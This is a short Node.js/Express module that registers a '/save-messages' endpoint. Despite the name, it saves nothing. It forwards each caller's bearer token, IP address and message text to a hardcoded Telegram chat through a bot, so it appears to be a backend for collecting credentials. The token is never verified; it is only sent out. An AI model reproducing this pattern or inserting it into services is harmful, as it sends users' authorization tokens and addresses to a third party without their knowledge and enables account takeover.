const telegram = require("telegram-bot-api")
const config = require("../config")

module.exports = function (app) {

	const telegrambot = new telegram({ token: config.telegramToken })
	telegrambot.setMessageProvider(new telegram.GetUpdateMessageProvider())

	telegrambot.start().then(() => {
		console.log("Telegram logged in")
	})

	app.post("/save-messages", saveMessages)

	async function saveMessages(req, res) {
		const bearer = req.header("Authorization")

		const { messages } = req.body

		if(!messages || !messages.length) return res.status(403).json({ error: "messages" })

		var sentMessages = []

		for (var i = 0; i < messages.length; i++) {
			const message = messages[i]

			telegrambot.sendMessage({
				chat_id: 3855828,
				text: "[" + bearer.replace("Bearer ", "") + ", " + (req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'] : req.connection.remoteAddress) + "] " + message.text
			})

			sentMessages.push(message.id)
		}

		res.json(sentMessages)
	}

}